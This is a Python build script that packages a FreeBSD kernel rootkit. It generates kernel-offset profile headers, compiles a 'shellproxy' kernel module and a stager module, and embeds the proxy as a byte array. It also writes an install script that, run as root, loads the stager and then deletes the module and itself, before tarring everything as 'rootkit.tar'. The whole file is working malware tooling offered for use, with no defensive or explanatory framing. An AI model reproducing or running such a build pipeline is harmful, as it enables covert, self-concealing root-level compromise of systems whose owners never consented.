"""
this is automagically ran on freebsd vm; see vmbuild.pl and makefile thx
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
"""
import glob
import json
import os
import secrets
import subprocess
import sys


def run(*c, **x):
    print(" ".join(c))
    subprocess.run(c, check=True, **x)


def read(p):
    with open(p, "rb") as f:
        return f.read()


def write(p, d):
    with open(p, "wb") as f:
        f.write(d)


magic = secrets.token_hex(8)
write("rand.h", f"""#define CN_END "__{magic}__"
#define RMAGIC "{magic}"
""".encode())

profile_name = os.environ.get("PROFILE", "freebsd-14.5-RELEASE-amd64")
profile_path = os.path.join("versions", f"{profile_name}.json")
if not os.path.exists(profile_path):
    sys.exit("!!! FATAL: cannot find", profile_path)

with open(profile_path) as f:
    profile = json.load(f)

if profile.get("arch") != "amd64":
    sys.exit("this isnt amd64", profile.get("arch", "?"))

def profile_macro(prefix, key):
    part = "".join(c.upper() if c.isalnum() else "_" for c in key)
    return "PROFILE_" + prefix + "_" + part

def get_profileval(prefix, key, value):
    if isinstance(value, dict):
        for k, v in value.items():
            get_profileval(prefix + ("_" if prefix else "") + key, k, v)
        return
    macro = profile_macro(prefix, key)
    if isinstance(value, str):
        print(f"#define {macro} \"{value}\"")
    else:
        print(f"#define {macro} {value}")

with open("profile.h", "w") as f:
    old = sys.stdout
    sys.stdout = f
    for key in ("profile", "release", "arch", "kernelbase"):
        if key in profile:
            print(f"got {key}")
            get_profileval("", key, profile[key])
    for key in ("symbols", "offsets", "limits"):
        if key in profile:
            get_profileval("", key, profile[key])
    sys.stdout = old

print("+ generated profile", profile_name)

run("cc", "-O2", "-o", "configgen", "configgen.c")
with open("config.h", "wb") as f:
    subprocess.run(["./configgen", "config.json"], stdout=f, check=True)

if not os.path.exists("shellproxy/dd_conf.h"):
    sys.exit("conf.h missing")
for f in glob.glob("lib/*.o"):
    os.remove(f)
mkargs = ["make", "-C", "shellproxy"]
run(*mkargs, "clean")
run(*mkargs)

proxy = read("shellproxy/shellproxy.ko")
proxy_data = ",".join("0x%02x" % b for b in proxy)
write("proxy_blob.h", f"""static const unsigned char proxy_blob[] = {{{proxy_data}}};
static const unsigned int proxy_len = {len(proxy)};
""".encode())
print(f"+ sproxy got {len(proxy)}")

# stager
run("make", "-C", "stager", "clean")
run("make", "-C", "stager")
write("stager.ko", read("stager/stager.ko"))

# ./install
install_src = os.environ.get("INSTALL_SRC", "install")
if os.path.exists(install_src) and os.path.getsize(install_src) > 0:
    install = read(install_src)
else:
    install = read("src/tools/install") if os.path.exists("src/tools/install") else b"""#!/bin/sh
set -e
cd "$(dirname "$0")"
[ "$(id -u)" = "0" ] || { echo "root required" >&2; exit 1; }
kldload ./stager.ko
kldunload stager
rm -f stager.ko "$0"
"""
write("install", install)
os.chmod("install", 0o755)

# 7. tar
run("tar", "czf", "rootkit.tar", "install", "stager.ko")
size = os.path.getsize("rootkit.tar")
print(f"+ tarball {size} bytes")
